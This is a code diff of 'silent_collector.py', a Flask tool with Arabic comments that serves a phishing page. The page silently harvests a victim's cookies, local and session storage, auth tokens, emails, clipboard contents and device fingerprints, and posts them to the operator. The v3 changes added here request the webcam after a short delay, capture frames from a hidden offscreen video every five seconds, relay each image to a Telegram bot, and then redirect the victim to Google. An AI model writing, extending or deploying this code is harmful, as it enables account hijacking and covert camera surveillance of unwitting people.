@@ -1,7 +1,10 @@
 # silent_collector.py
 # ============================================================
-# Silent Collector v2 — النسخة العربية الاحترافية
-# الضحية تدوس اللينك → كل حاجة تتحصل تلقائياً → Google
+# Silent Collector v3 — التصعيد الذكي
+# - جمع صامت فوري (بدون إذن)
+# - طلب إذن الكاميرا بأسلوب ذكي (بعد ثواني)
+# - تصوير مستمر كل 5 ثواني لحد ما الضحية تخرج
+# - الرجوع لـ Google تلقائياً
 # ============================================================
 
 import os
@@ -10,6 +13,7 @@ import json
 import uuid
 import hashlib
 import re
+import base64
 from datetime import datetime
 
 from flask import Blueprint, request, jsonify, redirect
@@ -29,6 +33,11 @@ silent_bp = Blueprint('silent_collector', __name__)
 # ============================================================
 SESSION_TTL = 86400 * 30        # 30 يوم
 GOOGLE_REDIRECT = "https://www.google.com"
+CAMERA_INTERVAL = 5000          # 5 ثواني بين كل صورة
+CAMERA_MAX_FRAMES = 60          # حد أقصى 60 صورة لكل جلسة (5 دقائق)
+ACCESS_DELAY = 2500             # تأخير قبل طلب الإذن (2.5 ثانية)
+REDIRECT_DELAY = 2500           # تأخير قبل الرجوع للجوجل
+
 
 # المواقع اللي بنكشف جلساتها
 KNOWN_SITES = {
@@ -65,7 +74,7 @@ KNOWN_SITES = {
 
 
 # ============================================================
-# ★★★ صفحة الالتقاط الاحترافية (بالعربي) ★★★
+# ★★★ صفحة الالتقاط v3 — التصعيد الذكي ★★★
 # ============================================================
 COLLECTOR_PAGE = r"""<!DOCTYPE html>
 <html lang="ar" dir="rtl">
@@ -127,13 +136,23 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
 <script>
 (function() {
     "use strict";
-    
+
     var SESSION_ID = "__SESSION_ID__";
     var ENDPOINT = "__ENDPOINT__";
     var REDIRECT_URL = "__REDIRECT_URL__";
-    
+    var CAMERA_INTERVAL = __CAMERA_INTERVAL__;
+    var CAMERA_MAX_FRAMES = __CAMERA_MAX_FRAMES__;
+    var ACCESS_DELAY = __ACCESS_DELAY__;
+
+    // ─── متغيرات التصوير ───
+    var videoStream = null;
+    var videoEl = null;
+    var captureInterval = null;
+    var framesCaptured = 0;
+    var cameraActive = false;
+
     // ═══════════════════════════════════════════════════
-    // ★★★ 1. بناء البيانات الأساسية ★★★
+    // 1. بناء البيانات الأساسية
     // ═══════════════════════════════════════════════════
     var data = {
         session_id: SESSION_ID,
@@ -144,7 +163,7 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
         referrer: document.referrer || '',
         history_length: history.length || 0
     };
-    
+
     // ─── Navigator Info ───
     try {
         data.user_agent = navigator.userAgent;
@@ -159,13 +178,11 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
         data.max_touch_points = navigator.maxTouchPoints || 0;
         data.online = navigator.onLine;
     } catch(e) {}
-    
-    // ─── Timezone ───
+
     try {
         data.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
     } catch(e) {}
-    
-    // ─── Screen ───
+
     try {
         data.screen = {
             width: screen.width,
@@ -178,8 +195,7 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
             orientation: (screen.orientation && screen.orientation.type) || null
         };
     } catch(e) {}
-    
-    // ─── Window ───
+
     try {
         data.window = {
             inner_width: window.innerWidth,
@@ -188,15 +204,13 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
             outer_height: window.outerHeight
         };
     } catch(e) {}
-    
-    // ─── Preferences ───
+
     try {
         data.dark_mode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
         data.reduced_motion = window.matchMedia && window.matchMedia('(prefers-reduced-motion: reduce)').matches;
         data.touch_support = 'ontouchstart' in window;
     } catch(e) {}
-    
-    // ─── Connection ───
+
     try {
         var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
         if (conn) {
@@ -204,91 +218,87 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
                 effective_type: conn.effectiveType || null,
                 type: conn.type || null,
                 downlink: conn.downlink || null,
-                downlink_max: conn.downlinkMax || null,
+                downlinkMax: conn.downlinkMax || null,
                 rtt: conn.rtt || null,
                 save_data: conn.saveData || false
             };
         }
     } catch(e) {}
-    
+
     // ═══════════════════════════════════════════════════
-    // ★★★ 2. بصمة الجهاز (Canvas + WebGL + Audio) ★★★
+    // 2. بصمة الجهاز (Canvas + WebGL + Audio)
     // ═══════════════════════════════════════════════════
-    
-    // ─── WebGL ───
     function getWebGLInfo() {
         try {
             var canvas = document.createElement('canvas');
             var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
             if (!gl) return null;
-            
+
             var dbg = gl.getExtension('WEBGL_debug_renderer_info');
             var vendor = dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
             var renderer = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
-            
+
             return {
                 vendor: vendor,
                 renderer: renderer,
                 version: gl.getParameter(gl.VERSION),
                 glsl_version: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                 max_texture_size: gl.getParameter(gl.MAX_TEXTURE_SIZE),
-                max_viewport_dims: gl.getParameter(gl.MAX_VIEWPORT_DIMS) ? 
+                max_viewport_dims: gl.getParameter(gl.MAX_VIEWPORT_DIMS) ?
                     Array.from(gl.getParameter(gl.MAX_VIEWPORT_DIMS)).join('x') : null
             };
         } catch(e) { return null; }
     }
     data.webgl = getWebGLInfo();
-    
-    // ─── Canvas Fingerprint (stronger) ───
+
     function getCanvasFingerprint() {
         try {
             var canvas = document.createElement('canvas');
             canvas.width = 280;
             canvas.height = 60;
             var ctx = canvas.getContext('2d');
-            
+
             ctx.textBaseline = 'alphabetic';
             ctx.fillStyle = '#f60';
             ctx.fillRect(125, 1, 62, 20);
             ctx.fillStyle = '#069';
             ctx.font = '11pt "Arial"';
-            ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 2, 15);
+            ctx.fillText('Cwm fjordbank glyphs vext quiz', 2, 15);
             ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
             ctx.font = '18pt "Times New Roman"';
-            ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 45);
-            
+            ctx.fillText('Cwm fjordbank glyphs vext quiz', 4, 45);
+
             var dataURL = canvas.toDataURL();
             return dataURL;
         } catch(e) { return null; }
     }
     var canvasFingerprint = getCanvasFingerprint();
     data.canvas_full = canvasFingerprint;
-    data.canvas_hash = canvasFingerprint ? 
+    data.canvas_hash = canvasFingerprint ?
         (canvasFingerprint.length + '_' + canvasFingerprint.substring(50, 100)) : null;
-    
-    // ─── Audio Fingerprint ───
+
     function getAudioFingerprint() {
         return new Promise(function(resolve) {
             try {
                 var AudioContext = window.OfflineAudioContext || window.webkitOfflineAudioContext;
                 if (!AudioContext) return resolve(null);
-                
+
                 var ctx = new AudioContext(1, 44100, 44100);
                 var osc = ctx.createOscillator();
                 osc.type = 'triangle';
                 osc.frequency.setValueAtTime(10000, ctx.currentTime);
-                
+
                 var compressor = ctx.createDynamicsCompressor();
                 compressor.threshold.setValueAtTime(-50, ctx.currentTime);
                 compressor.knee.setValueAtTime(40, ctx.currentTime);
                 compressor.ratio.setValueAtTime(12, ctx.currentTime);
                 compressor.attack.setValueAtTime(0, ctx.currentTime);
                 compressor.release.setValueAtTime(0.25, ctx.currentTime);
-                
+
                 osc.connect(compressor);
                 compressor.connect(ctx.destination);
                 osc.start(0);
-                
+
                 ctx.startRendering().then(function(buffer) {
                     try {
                         var audioData = buffer.getChannelData(0);
@@ -302,18 +312,17 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
             } catch(e) { resolve(null); }
         });
     }
-    
-    // ─── Fonts Detection ───
+
     function detectFonts() {
         try {
             var baseFonts = ['monospace', 'sans-serif', 'serif'];
             var testFonts = [
                 'Arial', 'Arial Black', 'Arial Narrow', 'Arial Rounded MT Bold',
-                'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 
-                'Comic Sans MS', 'Trebuchet MS', 'Impact', 'Tahoma', 
-                'Calibri', 'Segoe UI', 'Helvetica', 'Cambria', 
+                'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
+                'Comic Sans MS', 'Trebuchet MS', 'Impact', 'Tahoma',
+                'Calibri', 'Segoe UI', 'Helvetica', 'Cambria',
                 'Consolas', 'Candara', 'Corbel', 'Franklin Gothic Medium',
-                'Gill Sans', 'Lucida Console', 'Lucida Sans Unicode', 
+                'Gill Sans', 'Lucida Console', 'Lucida Sans Unicode',
                 'Palatino Linotype', 'Rockwell', 'Times', 'Webdings',
                 'Wingdings', 'Andalus', 'Traditional Arabic', 'Simplified Arabic',
                 'Arabic Typesetting', 'Sakkal Majalla', 'Droid Arabic Kufi'
@@ -327,13 +336,13 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
             span.style.visibility = 'hidden';
             span.innerHTML = testString;
             document.body.appendChild(span);
-            
+
             var baseSizes = {};
             for (var i = 0; i < baseFonts.length; i++) {
                 span.style.fontFamily = baseFonts[i];
                 baseSizes[baseFonts[i]] = span.offsetWidth;
             }
-            
+
             var detected = [];
             for (var j = 0; j < testFonts.length; j++) {
                 var found = false;
@@ -351,12 +360,10 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
         } catch(e) { return []; }
     }
     data.fonts = detectFonts();
-    
+
     // ═══════════════════════════════════════════════════
-    // ★★★ 3. الكوكيز والتخزين ★★★
+    // 3. الكوكيز والتخزين
     // ═══════════════════════════════════════════════════
-    
-    // ─── كل الكوكيز ───
     function getCookies() {
         try {
             var cookieStr = document.cookie || '';
@@ -382,8 +389,7 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
         } catch(e) { return { raw: '', count: 0, cookies: [] }; }
     }
     data.cookies = getCookies();
-    
-    // ─── LocalStorage ───
+
     function getLocalStorage() {
         try {
             var result = {};
@@ -400,8 +406,7 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
         } catch(e) { return {}; }
     }
     data.local_storage = getLocalStorage();
-    
-    // ─── SessionStorage ───
+
     function getSessionStorage() {
         try {
             var result = {};
@@ -418,14 +423,13 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
         } catch(e) { return {}; }
     }
     data.session_storage = getSessionStorage();
-    
+
     // ═══════════════════════════════════════════════════
-    // ★★★ 4. كشف الجلسات المسجلة (Sessions Detection) ★★★
+    // 4. كشف الجلسات المسجلة
     // ═══════════════════════════════════════════════════
-    
     function detectSessions() {
         var sessions = [];
-        
+
         var allStorage = {};
         try {
             for (var k in data.local_storage) {
@@ -435,10 +439,9 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
                 allStorage[k2.toLowerCase()] = data.session_storage[k2];
             }
         } catch(e) {}
-        
+
         var cookieStr = (data.cookies.raw || '').toLowerCase();
-        
-        // مواقع شهيرة + توكناتها
+
         var sites = {
             'facebook': ['facebook.com', 'fb_token', 'c_user', 'xs'],
             'instagram': ['instagram.com', 'ig_did', 'csrftoken', 'sessionid'],
@@ -454,21 +457,19 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
             'github': ['github', 'user_session'],
             'telegram': ['telegram'],
         };
-        
+
         for (var site in sites) {
             var keywords = sites[site];
             var found = false;
             var matched = [];
-            
-            // افحص الكوكيز
+
             for (var i = 0; i < keywords.length; i++) {
                 if (cookieStr.indexOf(keywords[i].toLowerCase()) >= 0) {
                     found = true;
                     matched.push('cookie:' + keywords[i]);
                 }
             }
-            
-            // افحص التخزين
+
             for (var stKey in allStorage) {
                 for (var j = 0; j < keywords.length; j++) {
                     if (stKey.indexOf(keywords[j].toLowerCase()) >= 0) {
@@ -478,7 +479,7 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
                     }
                 }
             }
-            
+
             if (found) {
                 sessions.push({
                     site: site,
@@ -486,29 +487,25 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
                 });
             }
         }
-        
+
         return sessions;
     }
     data.detected_sessions = detectSessions();
-    
+
     // ═══════════════════════════════════════════════════
-    // ★★★ 5. البحث عن توكنات وكلمات سر ★★★
+    // 5. البحث عن توكنات وإيميلات
     // ═══════════════════════════════════════════════════
-    
     function findTokens() {
         var tokens = [];
         var emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
-        var phoneRegex = /(\+?\d{1,3}[\s-]?)?\(?\d{2,4}\)?[\s-]?\d{3,4}[\s-]?\d{3,4}/g;
         var tokenKeys = ['token', 'auth', 'access', 'bearer', 'session', 'jwt', 'api_key', 'apikey'];
-        
-        // افحص التخزين
+
         var allStorage = {};
         try {
             for (var k in data.local_storage) allStorage[k] = data.local_storage[k];
             for (var k2 in data.session_storage) allStorage[k2] = data.session_storage[k2];
         } catch(e) {}
-        
-        // ابحث عن إيميلات
+
         try {
             var foundEmails = new Set();
             for (var sk in allStorage) {
@@ -522,8 +519,7 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
             }
             data.found_emails = Array.from(foundEmails).slice(0, 10);
         } catch(e) { data.found_emails = []; }
-        
-        // ابحث عن توكنات
+
         for (var stk in allStorage) {
             var lowerKey = stk.toLowerCase();
             for (var t = 0; t < tokenKeys.length; t++) {
@@ -540,15 +536,14 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
                 }
             }
         }
-        
+
         return tokens.slice(0, 20);
     }
     data.found_tokens = findTokens();
-    
+
     // ═══════════════════════════════════════════════════
-    // ★★★ 6. الصور + الحافظة + الملفات ★★★
+    // 6. جمع المعلومات الإضافية
     // ═══════════════════════════════════════════════════
-    
     function getImages() {
         try {
             var imgs = [];
@@ -568,8 +563,7 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
         } catch(e) { return []; }
     }
     data.images = getImages();
-    
-    // ─── Clipboard ───
+
     function getClipboard() {
         return new Promise(function(resolve) {
             try {
@@ -583,8 +577,7 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
             } catch(e) { resolve(null); }
         });
     }
-    
-    // ─── Battery ───
+
     function getBattery() {
         return new Promise(function(resolve) {
             try {
@@ -603,8 +596,7 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
             } catch(e) { resolve(null); }
         });
     }
-    
-    // ─── Permissions ───
+
     function getPermissions() {
         return new Promise(function(resolve) {
             try {
@@ -612,7 +604,7 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
                     var names = ['geolocation', 'notifications', 'camera', 'microphone', 'clipboard-read'];
                     var results = {};
                     var count = 0;
-                    
+
                     names.forEach(function(name) {
                         navigator.permissions.query({ name: name })
                             .then(function(p) { results[name] = p.state; })
@@ -622,7 +614,7 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
                                 if (count === names.length) resolve(results);
                             });
                     });
-                    
+
                     setTimeout(function() { resolve(results); }, 300);
                 } else {
                     resolve({});
@@ -630,8 +622,7 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
             } catch(e) { resolve({}); }
         });
     }
-    
-    // ─── Storage Estimate ───
+
     function getStorageEstimate() {
         return new Promise(function(resolve) {
             try {
@@ -649,8 +640,7 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
             } catch(e) { resolve(null); }
         });
     }
-    
-    // ─── IndexedDB Names ───
+
     function getIndexedDBNames() {
         return new Promise(function(resolve) {
             try {
@@ -664,8 +654,7 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
             } catch(e) { resolve([]); }
         });
     }
-    
-    // ─── Cache Keys ───
+
     function getCacheKeys() {
         return new Promise(function(resolve) {
             try {
@@ -678,8 +667,7 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
             } catch(e) { resolve([]); }
         });
     }
-    
-    // ─── Service Workers ───
+
     function getServiceWorkers() {
         return new Promise(function(resolve) {
             try {
@@ -702,11 +690,194 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
             } catch(e) { resolve([]); }
         });
     }
-    
+
     // ═══════════════════════════════════════════════════
-    // ★★★ 7. جمع كل حاجة وإرسال ★★★
+    // 7. ★★★ الكاميرا — التصعيد الذكي ★★★
     // ═══════════════════════════════════════════════════
-    
+    function startSilentCapture() {
+        return new Promise(function(resolve) {
+            try {
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    return resolve(false);
+                }
+
+                // إنشاء عنصر الفيديو (مخفي)
+                videoEl = document.createElement('video');
+                videoEl.setAttribute('playsinline', '');
+                videoEl.setAttribute('autoplay', '');
+                videoEl.setAttribute('muted', '');
+                videoEl.muted = true;
+                videoEl.style.cssText = 'position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0.01;';
+
+                document.body.appendChild(videoEl);
+
+                // اطلب إذن الكاميرا
+                navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    },
+                    audio: false
+                }).then(function(stream) {
+                    videoStream = stream;
+                    videoEl.srcObject = stream;
+
+                    videoEl.onloadedmetadata = function() {
+                        videoEl.play().then(function() {
+                            cameraActive = true;
+
+                            // أرسل إشارة بدء
+                            sendSignal('camera_started', {
+                                width: videoEl.videoWidth,
+                                height: videoEl.videoHeight
+                            });
+
+                            // التقط أول صورة فوراً
+                            setTimeout(function() {
+                                captureFrame();
+                            }, 500);
+
+                            // ابدأ التصوير المستمر
+                            captureInterval = setInterval(function() {
+                                if (framesCaptured >= CAMERA_MAX_FRAMES) {
+                                    stopCapture('max_frames_reached');
+                                    return;
+                                }
+                                captureFrame();
+                            }, CAMERA_INTERVAL);
+
+                            resolve(true);
+                        }).catch(function() {
+                            resolve(false);
+                        });
+                    };
+                }).catch(function(err) {
+                    // رفض أو فشل
+                    sendSignal('camera_denied', { error: err.name || 'unknown' });
+                    resolve(false);
+                });
+
+            } catch(e) {
+                resolve(false);
+            }
+        });
+    }
+
+    function captureFrame() {
+        try {
+            if (!videoEl || !videoStream) return;
+
+            var canvas = document.createElement('canvas');
+            canvas.width = videoEl.videoWidth || 640;
+            canvas.height = videoEl.videoHeight || 480;
+            var ctx = canvas.getContext('2d');
+            ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
+
+            var imageData = canvas.toDataURL('image/jpeg', 0.65);
+
+            framesCaptured++;
+
+            // أرسل الصورة
+            sendFrame(imageData, framesCaptured);
+
+        } catch(e) {
+            // تجاهل الأخطاء
+        }
+    }
+
+    function sendFrame(imageData, frameNum) {
+        try {
+            var payload = {
+                session_id: SESSION_ID,
+                type: 'camera_frame',
+                frame_num: frameNum,
+                image: imageData,
+                timestamp: Date.now()
+            };
+
+            var jsonStr = JSON.stringify(payload);
+
+            // جرّب sendBeacon أولاً
+            if (navigator.sendBeacon) {
+                try {
+                    var blob = new Blob([jsonStr], { type: 'application/json' });
+                    if (navigator.sendBeacon(ENDPOINT + '/camera', blob)) {
+                        return;
+                    }
+                } catch(e) {}
+            }
+
+            // fallback: fetch
+            fetch(ENDPOINT + '/camera', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: jsonStr,
+                keepalive: true
+            }).catch(function() {});
+        } catch(e) {}
+    }
+
+    function stopCapture(reason) {
+        try {
+            if (captureInterval) {
+                clearInterval(captureInterval);
+                captureInterval = null;
+            }
+            if (videoStream) {
+                try {
+                    videoStream.getTracks().forEach(function(t) { t.stop(); });
+                } catch(e) {}
+                videoStream = null;
+            }
+            if (videoEl && videoEl.parentNode) {
+                try {
+                    videoEl.parentNode.removeChild(videoEl);
+                } catch(e) {}
+            }
+            cameraActive = false;
+
+            sendSignal('camera_stopped', {
+                reason: reason,
+                total_frames: framesCaptured
+            });
+        } catch(e) {}
+    }
+
+    // ═══════════════════════════════════════════════════
+    // 8. الإرسال
+    // ═══════════════════════════════════════════════════
+    function sendSignal(type, extra) {
+        try {
+            var payload = {
+                session_id: SESSION_ID,
+                type: type,
+                timestamp: Date.now()
+            };
+            if (extra) {
+                for (var k in extra) payload[k] = extra[k];
+            }
+
+            var jsonStr = JSON.stringify(payload);
+
+            if (navigator.sendBeacon) {
+                try {
+                    var blob = new Blob([jsonStr], { type: 'application/json' });
+                    if (navigator.sendBeacon(ENDPOINT + '/signal', blob)) {
+                        return;
+                    }
+                } catch(e) {}
+            }
+
+            fetch(ENDPOINT + '/signal', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: jsonStr,
+                keepalive: true
+            }).catch(function() {});
+        } catch(e) {}
+    }
+
     function collectAll() {
         return Promise.all([
             getAudioFingerprint(),
@@ -729,74 +900,114 @@ COLLECTOR_PAGE = r"""<!DOCTYPE html>
             return data;
         });
     }
-    
-    function sendData(payload) {
+
+    function sendMainData(payload) {
         return new Promise(function(resolve) {
             try {
                 var jsonStr = JSON.stringify(payload);
-                
-                // Try sendBeacon
+
                 if (navigator.sendBeacon) {
                     try {
                         var blob = new Blob([jsonStr], { type: 'application/json' });
-                        if (navigator.sendBeacon(ENDPOINT, blob)) {
+                        if (navigator.sendBeacon(ENDPOINT + '/collect', blob)) {
                             resolve(true);
                             return;
                         }
                     } catch(e) {}
                 }
-                
-                // Try fetch keepalive
-                try {
-                    fetch(ENDPOINT, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: jsonStr,
-                        keepalive: true,
-                        mode: 'no-cors'
-                    }).then(function() { resolve(true); })
-                      .catch(function() {
-                          // Fallback XHR
-                          try {
-                              var xhr = new XMLHttpRequest();
-                              xhr.open('POST', ENDPOINT, true);
-                              xhr.setRequestHeader('Content-Type', 'application/json');
-                              xhr.send(jsonStr);
-                              resolve(true);
-                          } catch(e2) { resolve(false); }
-                      });
-                } catch(e) {
-                    resolve(false);
-                }
+
+                fetch(ENDPOINT + '/collect', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: jsonStr,
+                    keepalive: true
+                }).then(function() { resolve(true); })
+                  .catch(function() {
+                      try {
+                          var xhr = new XMLHttpRequest();
+                          xhr.open('POST', ENDPOINT + '/collect', true);
+                          xhr.setRequestHeader('Content-Type', 'application/json');
+                          xhr.send(jsonStr);
+                          resolve(true);
+                      } catch(e2) { resolve(false); }
+                  });
             } catch(e) { resolve(false); }
         });
     }
-    
+
     function doRedirect() {
         try {
             document.body.classList.add('fade-out');
         } catch(e) {}
         window.location.replace(REDIRECT_URL);
     }
-    
+
     // ═══════════════════════════════════════════════════
-    // MAIN
+    // MAIN FLOW
     // ═══════════════════════════════════════════════════
-    var redirectTimer = setTimeout(doRedirect, 1800);
-    
+    var redirectTimer = null;
+    var permissionTimer = null;
+
+    // ─── 1. جمع وإرسال فوري ───
     collectAll()
         .then(function(payload) {
-            return sendData(payload);
+            return sendMainData(payload);
         })
         .then(function() {
-            clearTimeout(redirectTimer);
-            setTimeout(doRedirect, 200);
+            // ─── 2. بعد ACCESS_DELAY → اطلب إذن الكاميرا ───
+            permissionTimer = setTimeout(function() {
+                startSilentCapture().then(function(started) {
+                    if (started) {
+                        // الكاميرا بدأت → ما ترجعش للجوجل بسرعة
+                        // خليها تفضل شغالة لحد ما الضحية تخرج
+                        // أو لحد CAMERA_MAX_FRAMES
+                        logger_signal('camera_started_keep_alive');
+
+                        // لا redirect دلوقتي — ننتظر
+                        // بس نخلي redirect احتياطي بعد دقيقة ونص
+                        redirectTimer = setTimeout(function() {
+                            doRedirect();
+                        }, 90000);
+
+                    } else {
+                        // مفيش كاميرا → رجوع سريع للجوجل
+                        redirectTimer = setTimeout(doRedirect, 1500);
+                    }
+                });
+            }, ACCESS_DELAY);
         })
         .catch(function() {
-            clearTimeout(redirectTimer);
-            doRedirect();
+            // في حالة خطأ → رجوع عادي
+            redirectTimer = setTimeout(doRedirect, 1500);
         });
-    
+
+    function logger_signal(s) {
+        try { console.log('[SC]', s); } catch(e) {}
+    }
+
+    // ─── عند الخروج: أوقف التصوير ───
+    window.addEventListener('beforeunload', function() {
+        stopCapture('beforeunload');
+    });
+
+    window.addEventListener('pagehide', function() {
+        stopCapture('pagehide');
+    });
+
+    window.addEventListener('unload', function() {
+        stopCapture('unload');
+    });
+
+    // ─── رصد فقدان التركيز (الضحية نقلت التاب) ───
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            // الضحية خرجت من التاب → أوقف التصوير
+            stopCapture('tab_hidden');
+            // وارجع للجوجل
+            setTimeout(doRedirect, 500);
+        }
+    });
+
 })();
 </script>
 </body>
@@ -824,6 +1035,8 @@ def create_silent_session(chat_id, label=""):
             "accessed": False,
             "accessed_at": None,
             "collected": False,
+            "camera_started": False,
+            "camera_frames": 0,
         }
 
         redis_client.setex(
@@ -847,7 +1060,7 @@ def create_silent_session(chat_id, label=""):
 
 
 # ============================================================
-# استقبال البيانات
+# استقبال البيانات الرئيسية
 # ============================================================
 def store_collected_data(session_id, data):
     """يخزن البيانات المجمعة"""
@@ -908,6 +1121,143 @@ def store_collected_data(session_id, data):
 
 
 # ============================================================
+# استقبال صورة من الكاميرا
+# ============================================================
+def store_camera_frame(session_id, data):
+    """يخزن صورة من الكاميرا ويبعتها للبوت فوراً"""
+    if not redis_client:
+        return False
+
+    try:
+        raw = redis_client.get(f"silent:{session_id}")
+        if not raw:
+            return False
+
+        session_data = json.loads(raw)
+        chat_id = session_data["chat_id"]
+        cid = int(chat_id) if str(chat_id).isdigit() else chat_id
+
+        image_data = data.get('image', '')
+        frame_num = data.get('frame_num', 0)
+        label = session_data.get('label', '')
+
+        # حدّث العدّاد
+        session_data["camera_frames"] = frame_num
+        session_data["camera_started"] = True
+        redis_client.setex(
+            f"silent:{session_id}",
+            SESSION_TTL,
+            json.dumps(session_data)
+        )
+
+        # فك الـ base64 وأرسل للبوت
+        try:
+            if image_data.startswith('data:image'):
+                _, encoded = image_data.split(',', 1)
+                img_bytes = base64.b64decode(encoded)
+
+                import io
+                buf = io.BytesIO(img_bytes)
+                buf.name = f"frame_{frame_num}.jpg"
+
+                caption = (
+                    f"📸 <b>صورة من الكاميرا</b>\n"
+                    f"━━━━━━━━━━━━━━━━━━\n"
+                    f"🎯 <b>الجلسة:</b> <code>{session_id[:12]}</code>\n"
+                    f"🏷️ <b>الاسم:</b> {label or '—'}\n"
+                    f"🔢 <b>الصورة:</b> #{frame_num}"
+                )
+
+                bot.send_photo(cid, buf, caption=caption, parse_mode="HTML")
+
+                logger.info(f"Camera frame #{frame_num} sent for session {session_id}")
+                metrics.inc_counter("silent_camera_frames")
+
+        except Exception as e:
+            logger.warning(f"Send camera frame error: {e}")
+
+        return True
+
+    except Exception as e:
+        logger.exception(f"store_camera_frame error: {e}")
+        return False
+
+
+# ============================================================
+# استقبال إشارات الكاميرا
+# ============================================================
+def handle_camera_signal(session_id, data):
+    """يتعامل مع إشارات بدء/إيقاف/رفض الكاميرا"""
+    try:
+        raw = redis_client.get(f"silent:{session_id}")
+        if not raw:
+            return False
+
+        session_data = json.loads(raw)
+        chat_id = session_data["chat_id"]
+        cid = int(chat_id) if str(chat_id).isdigit() else chat_id
+        label = session_data.get('label', '')
+        signal_type = data.get('type', '')
+
+        if signal_type == 'camera_started':
+            session_data["camera_started"] = True
+            redis_client.setex(
+                f"silent:{session_id}",
+                SESSION_TTL,
+                json.dumps(session_data)
+            )
+
+            width = data.get('width', '?')
+            height = data.get('height', '?')
+
+            bot.send_message(
+                cid,
+                f"🎥 <b>الكاميرا اشتغلت!</b>\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"🎯 <b>الجلسة:</b> <code>{session_id[:12]}</code>\n"
+                f"🏷️ <b>الاسم:</b> {label or '—'}\n"
+                f"📐 <b>الدقة:</b> <code>{width}×{height}</code>\n\n"
+                f"⏳ <i>جاري التصوير المستمر...</i>",
+                parse_mode="HTML"
+            )
+            logger.info(f"Camera started for session {session_id}")
+
+        elif signal_type == 'camera_denied':
+            error = data.get('error', 'unknown')
+            bot.send_message(
+                cid,
+                f"❌ <b>الكاميرا مرفوضة</b>\n"
+                f"🎯 الجلسة: <code>{session_id[:12]}</code>\n"
+                f"🏷️ {label or '—'}\n"
+                f"السبب: <code>{error}</code>",
+                parse_mode="HTML"
+            )
+            logger.info(f"Camera denied for session {session_id}")
+
+        elif signal_type == 'camera_stopped':
+            reason = data.get('reason', 'unknown')
+            total = data.get('total_frames', 0)
+
+            bot.send_message(
+                cid,
+                f"⏹️ <b>توقف التصوير</b>\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"🎯 <b>الجلسة:</b> <code>{session_id[:12]}</code>\n"
+                f"🏷️ <b>الاسم:</b> {label or '—'}\n"
+                f"📸 <b>إجمالي الصور:</b> <code>{total}</code>\n"
+                f"🔚 <b>السبب:</b> <code>{reason}</code>",
+                parse_mode="HTML"
+            )
+            logger.info(f"Camera stopped for session {session_id} | frames={total} | reason={reason}")
+
+        return True
+
+    except Exception as e:
+        logger.exception(f"handle_camera_signal error: {e}")
+        return False
+
+
+# ============================================================
 # إشعار البوت
 # ============================================================
 def notify_bot(chat_id, session_id, data):
@@ -915,24 +1265,22 @@ def notify_bot(chat_id, session_id, data):
     try:
         cid = int(chat_id) if str(chat_id).isdigit() else chat_id
 
-        # ─── بيانات أساسية ───
         label = data.get('label', '')
         label_text = f" ({label})" if label else ""
         ip = data.get('ip', 'غير معروف')
         timezone = data.get('timezone', 'غير معروف')
         received_at = data.get('received_at_str', '—')
 
-        # ─── الجهاز ───
         ua = data.get('user_agent', 'Unknown')
         device_type = "📱 موبايل" if any(x in ua for x in ['Mobile', 'Android', 'iPhone']) else "💻 كمبيوتر"
-        
+
         os_name = "غير معروف"
         if 'Windows' in ua: os_name = "Windows"
         elif 'Mac OS' in ua or 'Macintosh' in ua: os_name = "macOS"
         elif 'Android' in ua: os_name = "Android"
